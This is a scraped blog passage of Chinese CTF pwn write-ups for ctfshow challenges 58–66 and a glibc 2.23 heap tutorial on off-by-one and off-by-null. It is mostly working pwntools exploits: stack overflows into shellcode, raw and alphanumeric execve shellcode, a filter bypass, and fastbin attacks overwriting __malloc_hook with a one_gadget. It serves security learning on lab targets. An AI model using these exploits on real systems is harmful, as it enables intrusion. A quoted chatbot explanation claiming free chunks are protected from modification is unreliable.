asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\nctfshow59这道题与上一道一样只不过是64位的，注意生成shellcode的时候需要注明架构为64位\nfrom pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\nctfshow60Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        No PIE (0x8048000)    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No    Debuginfo:  Yes\n\n32位，NX保护没有开启，栈可以执行\nida：gets函数存在栈溢出，使用strncpy函数将对应的字符串复制到 buf2 处\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;CTFshow-pwn can u pwn me here!!&quot;);  gets(s);  strncpy(buf2, s, 100u);  printf(&quot;See you ~&quot;);  return 0;&#125;\n\n我们看一下buf2所在的位置\n\n然后看看bss段是否可执行\n\n我们看到是不可执行的，但是去看了一下师傅们的wp发现是可执行的，应该是版本的问题\n\n思路：我们将shellcode写入，然后填充垃圾数据覆盖返回地址为buf2，就可以了，因为strncpy函数会将对应的字符串复制到 buf2 处，所以shellcode也会被复制到buf2\n偏移为：112\nida是有问题的\n\nexp：\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28249)buf2 = 0x0804A080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112,b&#x27;a&#x27;)+p32(buf2)           #使用 ljust 函数将 shellcode 字符串用a补充到长度为 112io.sendline(payload)io.interactive()\n\nctfshow61Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        PIE enabled    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No\n\n64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化\nida：我们发现 printf函数将v5的地址打印出来了，我们可以将v5的地址接受保存下来，并将shellcode写入v5，再将返回地址覆盖为v5的地址就可以，但是v5到ret_addr的长度只有16字节，而shellcode要32字节，不会了，看一下师傅们的wp\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 v5[2]; // [rsp+0h] [rbp-10h] BYREF  v5[0] = 0LL;  v5[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, v5);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  gets(v5);  return 0;&#125;\n\n原来不只是长度不够，还有leave的问题\nleave的作用相当于MOV SP,BP；POP BP。 因为leave指令会释放栈空间，因此我们不能使用v5后面的24字节\n而且v5后的8个字节也不能存放（这里需要存放返回地址），所以我们只能将shellcode放在v5后的32字节的地方，并将返回地址改为v5后面32字节的地方\n如何接受到v5的正确地址：\n\n我们可以看到v5的地址实在[]里\nio.recvuntil(b&#x27;[&#x27;)                        #输入流中首先接收数据直到遇到 &#x27;[&#x27; 字符为止v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)        #再次接收直到遇到 &#x27;]&#x27; 字符为止v5 = int(v5, 16)                          #将变量 v5 解析为一个十六进制的整数#获取到的是字节串,p64()的参数是整形,要把字节串转化成整形# 不能用hex(int(v5_addr, 16)),因为hex的结果是字符串,不能传给p64()\n\nexp：\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28114)shellcode = asm(shellcraft.sh())io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))                    #打印v5的十六进制表示payload = b&#x27;a&#x27;*(0x10+0x8)         #溢出到返回地址payload += p64(v5+32)             #将将返回地址改为v5后面32字节的地方payload += shellcode              #将shellcode写入到v5后面32字节的地方io.sendline(payload)io.interactive()\n\nctfshow62Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX unknown - GNU_STACK missingPIE:        PIE enabledStack:      ExecutableRWX:        Has RWX segmentsStripped:   No\n\n64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化\nida：和上一题一样，只不过read为0x38字节（56），栈空间24，返回地址8不可用，所以最大写入的是56-24-8&#x3D;24，而自动生成的shellcode是0x30，所以不够了，看了一下师傅们的wp，需要找更短的shellcode\nshellcode =b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;   #22bytes\n\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF  buf[0] = 0LL;  buf[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, buf);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  read(0, buf, 0x38uLL);  return 0;&#125;\n\nexp\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28286)shellcode =b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))payload = b&#x27;a&#x27;*(0x10+0x8)payload += p64(v5+32)payload += shellcodeio.sendline(payload)io.interactive()\n\nctfshow63ida：和上一题一样，只不过可读入的更少了，只有0x37（55），55-24-8&#x3D;23，上一题用的shellcode为22字节，还可以用\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF  buf[0] = 0LL;  buf[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\\n&quot;, buf);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  read(0, buf, 0x37uLL);  return 0;&#125;\n\nexp：\nfrom pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28224)shellcode =b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27;io.recvuntil(b&#x27;[&#x27;)v5 = io.recvuntil(b&#x27;]&#x27;, drop=True)v5 = int(v5, 16)print(hex(v5))payload = b&#x27;a&#x27;*(0x10+0x8)payload += p64(v5+32)payload += shellcodeio.sendline(payload)io.interactive()\n\nctfshow64Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\n\n32位，NX保护开启，栈不可执行\nida：\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [esp+8h] [ebp-10h]  buf = mmap(0, 0x400u, 7, 34, 0, 0);  alarm(0xAu);  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 2, 0);  puts(&quot;Some different!&quot;);  if ( read(0, buf, 0x400u) &lt; 0 )  &#123;    puts(&quot;Illegal entry!&quot;);    exit(1);  &#125;  ((void (*)(void))buf)();  return 0;\n\n首先 buf &#x3D; mmap(0, 0x400u, 7, 34, 0, 0)没看懂，搜了一下\n#include &lt;sys/mman.h&gt;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);\n\n\n\n\naddr\nlength\nprot\nflags\nfd\noffset\n\n\n\n指定映射区域的起始地址（则由操作系统选择合适的地址）\n映射区域的大小\n决定映射区域的保护属性（设置为7可读可写可执行）\n决定映射的类型和行为\n文件描述符，用于指定要映射的文件\n文件的偏移量，指定从文件的哪个位置开始映射\n\n\n这个题将buf 将被设置为映射区域的起始地址，映射区域的大小为 0x400 字节，保护标志为7（映射的内存区域可以读、写和执行）\n大小0x400，足够写入shellcode，并且可以执行\n在看后面是一个if，是判断是否读取成功，如果 read 返回值小于 0，说明读取失败，并且退出程序\n最后((void (*)(void))buf)()\n将 buf 强制转换为一个函数指针类型，并且调用buf，我们将shellcode写入buf，就会被调用\nexp\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28112)shellcode = asm(shellcraft.sh())payload = shellcodeio.sendline(payload)io.interactive()\n\n\n\n","categories":["第三周"],"tags":["wp"]},{"title":"shellcode（ctfshow65）","url":"/2025/01/31/shellcode2/","content":"ctfshow65Arch:       amd64-64-littleRELRO:      Full RELROStack:      No canary foundNX:         NX unknown - GNU_STACK missingPIE:        PIE enabledStack:      ExecutableRWX:        Has RWX segmentsStripped:   No\n\n64位，开启PIE,完全开启RELRO,Has RWX segments  \nida：无法反编译，借助ai理解一下代码\n汇编代码1.jl (Jump if Less)\ncmp eax, ebxjl loc_1234\n\n如果 eax &lt; ebx，则跳转到 loc_1234\n2.jg (Jump if Greater)\ncmp eax, ebxjg loc_1234\n\n如果 eax &gt; ebx，则跳转到 loc_1234\n3.jle (Jump if Less or Equal)\ncmp eax, ebxjle loc_1234\n\n如果 eax &lt;= ebx，则跳转到 loc_1234\n4.jmp (Jump)\njmp loc_1234\n\n无论条件如何，都会跳转到 loc_1234\n5.cmp (Compare)\ncmp eax, ebx\n\n比较 eax 和 ebx 的大小，并根据结果设置标志位\n6.cdqe、movzx\ncdqemovzx   eax, [rbp+rax+buf]\n\n这个实在看不懂，粘一下师傅们的解释\ncdqe使用eax的最高位拓展rax高32位的所有位 movzx则是按无符号数传送+扩展（16-32） EAX是32位的寄存器，而AX是EAX的低16位,AH是ax的高8位，而AL是ax的低8位大致就是将我们输入的字符串每一位进行比较\nmain:    push    rbp    mov     rbp, rsp    sub     rsp, 410h    mov     edx, 14h    lea     rsi, aInputYouShellc    mov     edi, 1    mov     eax, 0    call    _write    lea     rax, [rbp+buf]    mov     edx, 400h    mov     rsi, rax    mov     edi, 0    mov     eax, 0    call    _read    mov     [rbp+var_8], eax    cmp     [rbp+var_8], 0    jg      short loc_11AC    mov     eax, 0    jmp     locret_1254\n\n提示用户输入：\n使用 _write 函数向标准输出打印提示信息 &quot;Input you Shellcode\\n&quot;。\n读取用户输入：\n使用 _read 函数从标准输入读取用户输入的数据，存储到缓冲区 buf 中。\nvar_8 存储了 _read 的返回值，表示实际读取的字节数。\n检查输入长度：\n如果 var_8 &gt; 0，表示用户输入了数据，程序跳转到 loc_11AC。\n如果 var_8 &lt;= 0，表示用户没有输入任何内容，程序直接返回\nloc_11AC:    mov     [rbp+var_4], 0    jmp     loc_123Aloc_11B8:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 60h ; &#x27;`&#x27;    jle     short loc_11DA    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 7Ah ; &#x27;z&#x27;    jle     short loc_1236    jmp     loc_11DAloc_11DA:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 40h ; &#x27;@&#x27;    jle     short loc_11FC    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 5Ah ; &#x27;Z&#x27;    jle     short loc_1236    jmp     loc_11FCloc_11FC:    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 2Fh ; &#x27;/&#x27;    jle     short loc_121E    mov     eax, [rbp+var_4]    cdqe    movzx   eax, [rbp+rax+buf]    cmp     al, 5Ah ; &#x27;Z&#x27;    jle     short loc_1236    jmp     loc_121Eloc_121E:    lea     rdi, format    mov     eax, 0    call    _printf    mov     eax, 0    jmp     locret_1254loc_1236:    add     [rbp+var_4], 1    jmp     loc_123Aloc_123A:    mov     eax, [rbp+var_4]    cmp     eax, [rbp+var_8]    jl      loc_11B8    lea     rax, [rbp+buf]    call    rax    mov     eax, 0locret_1254:    leave    retn\n\n初始化索引：\n在 loc_11AC，程序将 var_4 初始化为 0。\n循环检查输入内容：\n在 loc_11B8，程序逐字节检查用户输入的内容：\n如果字节值在 [0x2F, 0x5A] 或 [0x40, 0x5A] 或 [0x60, 0x7A] 范围内，程序继续检查下一个字节。\n[0x2F, 0x5A]：/到 Z（包括大小写字母和一些符号）\n[0x40, 0x5A]：@ 到 Z（主要是大写字母和一些符号）\n[0x60, 0x7A]：反引号到  z（主要是小写字母和一些符号）\n如果字节值不在上述范围内，程序打印 &quot;Good,but not right&quot; 并返回。\n执行用户输入：\n如果所有字节都满足条件，程序会将 buf 的地址加载到寄存器 rax 中，并调用 buf。这意味着程序会尝试执行用户输入的内容\n这些范围正好是ASSCII码的范围，我们可以直接将shellcode输入到buf，后面程序就会调用，但是输入的shellcode需要是可见字符string.printable\n生成可见字符shellcode使用alpha3就可以生成\nalpha031.生成shellcodefrom pwn import *context.arch=&#x27;amd64&#x27;sc = asm(shellcraft.sh())with open(&#x27;sc&#x27;, &#x27;bw&#x27;) as f:\tf.write(sc)\n\n2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件python3 sc.py &gt; sc\n\n3.使用alpha3生成string.printable （这里得用 python2）\npython2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器\n\nshellcode=&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;\n\n\nexp：from pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28139)shellcode=&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;payload = shellcode io.send(payload)   #注意不能用sendline换行符不在区间里io.interactive()\n\n","categories":["第三周"],"tags":["wp"]},{"title":"shellcode（ctfshow66）","url":"/2025/02/01/shellcode3/","content":"ctfshow66Arch:       amd64-64-little  RELRO:      Partial RELRO  Stack:      No canary found  NX:         NX enabled  PIE:        No PIE (0x400000)  Stripped:   No\n\n64位，NX栈不可执行开启\nida:\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  void *buf; // [rsp+8h] [rbp-8h]  init(argc, argv, envp);  logo();  buf = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);  puts(&quot;Your shellcode is :&quot;);  read(0, buf, 0x200uLL);  if ( !(unsigned int)check(buf) )  &#123;    printf(&quot; ERROR !&quot;);    exit(0);  &#125;  ((void (__fastcall *)(void *))buf)(buf);  return 0;&#125;\n\n这道题与前面ctfshow64差不多。多了一个检查\ncheck：\n__int64 __fastcall check(_BYTE *a1)&#123;  _BYTE *i; // [rsp+18h] [rbp-10h]  while ( *a1 )  &#123;    for ( i = &amp;unk_400F20; *i &amp;&amp; *i != *a1; ++i )      ;    if ( !*i )      return 0LL;    ++a1;  &#125;  return 1LL;&#125;\n\n意思检查数据是与unk_400F20里面的相同，相同返回1（假），不同返回0（真）\n在经过if判断检查是否通过\n检查失败情况：当 check 函数返回 0 时，(unsigned int)check(buf) 的结果为 0，再经过逻辑非运算 !(unsigned int)check(buf) 的结果为 1。此时 if 条件判断为真，程序会执行 if 语句块内的代码，先通过 printf(&quot; ERROR !&quot;); 输出错误信息 &quot; ERROR !&quot;，然后调用 exit(0) 终止程序。exit(0) 一般表示程序正常退出，但在这里实际上是因为输入的 buf 不符合检查要求而提前终止程序。\n检查通过情况：当 check 函数返回 1 时，(unsigned int)check(buf) 的结果为 1，经过逻辑非运算 !(unsigned int)check(buf) 的结果为 0。此时 if 条件判断为假，程序不会执行 if 语句块内的代码，而是继续执行后续的代码，也就是执行 ((void (__fastcall *)(void *))buf)(buf); 这行代码来执行用户输入的 shellcode。\n我们看一下unk_400F20里面的数据\n.rodata:0000000000400F20 unk_400F20      db  5Ah ; Z             ; DATA XREF: check+8↑o.rodata:0000000000400F21                 db  5Ah ; Z.rodata:0000000000400F22                 db  4Ah ; J.rodata:0000000000400F23                 db  20h.rodata:0000000000400F24                 db  6Ch ; l.rodata:0000000000400F25                 db  6Fh ; o.rodata:0000000000400F26                 db  76h ; v.rodata:0000000000400F27                 db  65h ; e.rodata:0000000000400F28                 db  73h ; s.rodata:0000000000400F29                 db  20h.rodata:0000000000400F2A                 db  73h ; s.rodata:0000000000400F2B                 db  68h ; h.rodata:0000000000400F2C                 db  65h ; e.rodata:0000000000400F2D                 db  6Ch ; l.rodata:0000000000400F2E                 db  6Ch ; l.rodata:0000000000400F2F                 db  5Fh ; _.rodata:0000000000400F30                 db  63h ; c.rodata:0000000000400F31                 db  6Fh ; o.rodata:0000000000400F32                 db  64h ; d.rodata:0000000000400F33                 db  65h ; e.rodata:0000000000400F34                 db  2Ch ; ,.rodata:0000000000400F35                 db  61h ; a.rodata:0000000000400F36                 db  6Eh ; n.rodata:0000000000400F37                 db  64h ; d.rodata:0000000000400F38                 db  20h.rodata:0000000000400F39                 db  68h ; h.rodata:0000000000400F3A                 db  65h ; e.rodata:0000000000400F3B                 db  72h ; r.rodata:0000000000400F3C                 db  65h ; e.rodata:0000000000400F3D                 db  20h.rodata:0000000000400F3E                 db  69h ; i.rodata:0000000000400F3F                 db  73h ; s.rodata:0000000000400F40                 db  20h.rodata:0000000000400F41                 db  61h ; a.rodata:0000000000400F42                 db  20h.rodata:0000000000400F43                 db  67h ; g.rodata:0000000000400F44                 db  69h ; i.rodata:0000000000400F45                 db  66h ; f.rodata:0000000000400F46                 db  74h ; t.rodata:0000000000400F47                 db  3Ah ; :.rodata:0000000000400F48                 db  0Fh.rodata:0000000000400F49                 db    5.rodata:0000000000400F4A                 db  20h.rodata:0000000000400F4B                 db  65h ; e.rodata:0000000000400F4C                 db  6Eh ; n.rodata:0000000000400F4D                 db  6Ah ; j.rodata:0000000000400F4E                 db  6Fh ; o.rodata:0000000000400F4F                 db  79h ; y.rodata:0000000000400F50                 db  20h.rodata:0000000000400F51                 db  69h ; i.rodata:0000000000400F52                 db  74h ; t.rodata:0000000000400F53                 db  21h ; !\n\n发现为可见字符串\n绕过if：\n1.我们可以用可见字符串写shellcode\n2.绕过 while(*a)，当它遇到\\x00就不检验了，我们可以使shellcode以\\x00开头\n利用脚本找\\x00开头的汇编代码\nfrom pwn import *from itertools import *import re for i in range(1, 3):    for j in product([p8(k) for k in range(256)], repeat=i):        payload = b&quot;\\x00&quot; + b&quot;&quot;.join(j)        res = disasm(payload)        if (            res != &quot;        ...&quot;            and not re.search(r&quot;\\[\\w*?\\]&quot;, res)            and &quot;.byte&quot; not in res        ):            print(res)            input()\n\n\n找到了一个’\\x00\\xc0’\nexp:\nfrom pwn import*context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28156)shellcode = asm(shellcraft.sh())payload = b&#x27;\\x00\\xc0&#x27;+shellcodeio.sendline(payload)io.interactive()\n\n","categories":["第三周"],"tags":["wp"]},{"title":"off by","url":"/2025/11/18/off-by/","content":"\n一、2.231.off by one，fastbin attack打malloc1.通过off by one使堆块合并泄露libc\nadd(0x18,b&#x27;aaaa&#x27;)add(0x68,b&#x27;bbbb&#x27;)add(0x68,b&#x27;cccc&#x27;)add(0x18,b&#x27;dddd&#x27;)edit(0,b&#x27;a&#x27;*24+b&#x27;\\xe1&#x27;)free(1)add(0x68,b&#x27;\\x00&#x27;*8)show(2)from pwn import *context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p=remote(&#x27;node3.buuoj.cn&#x27;,28465)p=process(&#x27;./vm&#x27;)elf=ELF(&#x27;./vm&#x27;)libc = ELF(&#x27;/home/he/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;)def bug():    gdb.attach(p)def add(size,content):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;1&quot;)        p.sendlineafter(&quot;size?&quot;,str(size))        p.sendlineafter(&quot;content:&quot;,content)def edit(idx,content):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;2&quot;)        p.sendlineafter(&quot;idx?&quot;,str(idx))        p.sendlineafter(&quot;content:&quot;,content)def dump(idx):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;3&quot;)        p.sendlineafter(&quot;idx?&quot;,str(idx))def free(idx):        p.recvuntil(&quot;choice: &quot;)        p.sendline(&quot;4&quot;)        p.sendlineafter(&quot;idx?&quot;,str(idx))add(0x18,b&#x27;aaaa&#x27;)add(0x68,b&#x27;bbbb&#x27;)add(0x68,b&#x27;cccc&#x27;)add(0x18,b&#x27;dddd&#x27;)edit(0,b&#x27;a&#x27;*24+b&#x27;\\xe1&#x27;)free(1)#bug()add(0x68,b&#x27;\\x00&#x27;*8)dump(2)fd = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))log.success(&#x27;fd:&#x27;+hex(fd))libc_base = fd - 0x3c4b78log.success(&#x27;libc_base:&#x27;+hex(libc_base))malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]fake_chunk_addr=malloc_hook-0x23log.success(&#x27;fake_chunk_addr:&#x27;+hex(fake_chunk_addr))add(0x68,b&#x27;\\x00&#x27;*8)free(2)edit(4,p64(fake_chunk_addr))add(0x68,b&#x27;aaaa&#x27;)#bug()one_gadget=libc_base+0x4527arealloc_addr=libc_base+libc.sym[&#x27;__libc_realloc&#x27;]log.success(&#x27;realloc_addr:&#x27;+hex(realloc_addr))log.success(&#x27;one_gadget:&#x27;+hex(one_gadget))payload=b&#x27;a&#x27;*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)bug()add(0x68,payload)p.recvuntil(&quot;choice: &quot;)p.sendline(&quot;1&quot;)p.sendlineafter(&quot;size?&quot;,str(0x18))p.interactive()\n\nadd(0x18, ‘aaaa’) #0\n必须是0x8结尾，这样才能覆盖size位\nadd(0x68, ‘aaaa’) #1\nadd(0x68, ‘aaaa’) #2\n合并的堆块要进入unsortbins\nadd(0x10, ‘aaaa’) #3\npayload &#x3D; ‘a’*0x18 + ‘\\xe1’  \n\\xe1是两个堆块合并后size位的大小\nedit(0, payload) \n往堆块0里面写因为off by one多写一个字节，使堆块1的size位被覆盖使得堆块1，2合并\ndelete(1)           \nfree掉堆块1，虽然在gdb中显示的是合并的整个大堆块被free了，但是堆块2并未被真正free，指针位未清零\nadd(0x60, ‘aaaa’)  \n将堆块1申请出来，堆块2还是被free状态（但是指针位未清零，此时fd与bk都指向main_arena+88，也就是unstort的头）\nshow(2）\n打印堆块2，就可以将main_arena+88的地址打印出来，根据偏移就可以算出libc\nfake_chunk_addr&#x3D;malloc_hook-0x23 \n假堆块的地址，为什么要选泽malloc_hook-0x23 因为malloc_hook-0x23，因为这里的size是0x7f，属于fastbin的范围，而且是在malloc_hook与realloc_hook的下面，可以修改其值，执行为one_gadget\nadd(0x68,b’\\x00’*8)\n将被指针未清零的的堆块2申请出来，也就是堆块4，堆块2，4指向的是同一个位置（所以gdb中只显示四个堆块）\nfree(4)\n将堆块4free\nedit(2,p64(fake_chunk_addr))\n通过堆块2修改已经free的堆块4的fd指针，修改为假的堆块地址\nadd(0x68,b’aaaa’)\n将堆块4申请出来\npayload&#x3D;b’a’*(0x13-0x08)+p64(one_gadget)+p64(realloc_addr+12)\n#bug()\nadd(0x68,payload)\n这个堆块在gdb中是看不到的，但是可以通过查看内存，看内容是否被更改\n这个堆块就是假的堆块了（0x13-0x08）这个是从malloc_hook-0x13的位置开始写入，因为size位0x10，指针指向写入数据的地方，-0x8是因为malloc_hook-0x8就是realloc_hook,将（malloc_hook-0x8）也就是realloc_hook的位置写入one_gadget,将malloc_hook的地方写入realloc_addr+12（这个是为了满足one_gadget调用的条件）\n\n**malloc_hook** 设置为 **realloc+offest**：通过覆盖堆上的函数指针，将 malloc_hook 指向 realloc。\n**realloc_hook** 设置为 **one_gadget**：通过覆盖堆上的另一个函数指针，将 realloc_hook 指向 one_gadget。\n\n这样，程序在调用 malloc 时，会跳转到 realloc，而在执行 realloc 时，会跳转到 one_gadget，最终执行恶意代码\n主要原因、realloc函数中有大量的push指令**（在执行__realloc_hook之前），因此我们将realloc函数的地址加上一定的偏移，就可以选择去执行一定量的push指令，从而抬高栈帧（我指的抬高栈帧是栈帧又向着低地址增长了）。这样rsp增加了之后，我们就可以控制例如rsp+0x30，让其内存值正好落在0处。\n\n\np.recvuntil(“choice: “)\np.sendline(“1”)\np.sendlineafter(“size?”,str(0x18))\np.interactive()\n调用malloc获取shell\n调用malloc函数—-&gt;判断是否有malloc_hook，有则调用之—-&gt;我们这里malloc_hook设置的为realloc函数+offset，程序便到此处执行—-&gt;执行realloc函数时，会判断是否有realloc_hook，有则调用之—-&gt;我们这里realloc_hook设置的为one_gadget，所以便会转到one_gadget处执行。\n疑问：那为什么不可以直接修改堆块2的内容也就是修改fd的值为假堆块，也就是为什么堆块2可以被打印，但无法修改里面的内容\n答案来自gpt：\n\n堆块合并：通过修改堆块的 size 字段，堆块1和堆块2被堆管理器合并成一个大的空闲堆块，释放堆块1，虽然gdb中显示整个大堆块被释放，但是堆块2并没有被显式释放。\n堆块2依然存在：虽然堆块2在gdb中显示被释放，但堆管理器并没有清除其内容，因此堆块2的内存仍然可以被访问，甚至打印出来。\n堆块2无法修改：因为堆块2已经被堆管理器标记为“空闲”，堆管理器限制了对其的修改操作，以防止潜在的内存破坏和不一致性。\n堆管理的内存保护：空闲块的内容通常不会被修改，堆管理器会确保内存的完整性，避免对空闲块的修改。只有在空闲块被重新分配或被进一步操作时，堆块的内容才可能被清除或修改。\n\nfastbins打malloc_hook与free_hook,都把堆块申请在malloc_hook&#x2F;free_hook-0x23\n2.off by null1.利用off by null，堆块合并泄露libc1.有edit\nadd(0x200,b&#x27;chunk0&#x27;)add(0x68,b&#x27;chunk1&#x27;)add(0x1f0,b&#x27;chunk2&#x27;)add(0x10,b&#x27;chunk3&#x27;)bug()free(0)edit(1,b&#x27;a&#x27;*0x60+p64(0x280))free(2)bug()add(0x200,b&#x27;chunk0&#x27;)show(1)fd = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))\n\nadd(0x200,b’chunk0’) \n这个随便但是要在unsortbins\nadd(0x68,b’chunk1’)\n必须在fastbins，而且必须是0x8结尾，因为这样才能覆盖到chunk2的pre_size位\nadd(0x1f0,b’chunk2’)\n堆块的size位必须是整百，这样off by null溢出的\\x00就会将p位覆盖为零且不影响size位\nadd(0x10,b’chunk3’)\n防止与top_chunk合并\nbug()\nfree(0)\n为后来泄露libc做准备\nedit(1,b’a’*0x60+p64(0x280))\n覆盖堆块1的pre_size位与p位，欺骗前面的堆块被free\nfree(2)\n使三个堆块合并成一个大堆块\nadd(0x200,b’chunk0’)\n将堆块0申请回来，使fd与bk压入堆块1\nshow(1)\n泄露libc\n2.没有edit，使用add来修改size位\nadd(0x200,b&#x27;chunk0&#x27;)add(0x18,b&#x27;chunk1&#x27;)add(0x1f0,b&#x27;chunk2&#x27;)add(0x10,b&#x27;chunk3&#x27;)bug()free(0)free(1)add(0x18,b&#x27;a&#x27;*0x10+p64(0x230))free(2)bug()add(0x200,b&#x27;chunk0&#x27;)show(0)fd = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))\n\n这里就只解释一下为什么是show(0),因为将堆块0，1都free了，所以先申请的0x18的堆块变成了堆块0，后申请的0x200的是堆块1\n2.off by null fastbin attack 打malloc因为我们将堆块0，又申请出来了，导致堆块1是free状态，可以打印，但无法修改，所以没发改fd，进行fastbin attach\n所以我们再多申请一个，使得四个堆块堆叠，堆块1泄露libc，用堆块2改fd进行fastbin attach\nadd(0x100 , b&#x27;chunk0&#x27;)add(0x100 , b&#x27;chun1&#x27;) add(0x68 , b&#x27;chunk2&#x27;) add(0xf0 , b&#x27;chunk3&#x27;) add(0x10 , b&#x27;chunk4&#x27;) payload = p64(0) * 12+ p64(0x290)edit(2 , payload)free(0)free(3)add(0x100 , b&#x27;chunk0&#x27;) show(1)fd =u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, 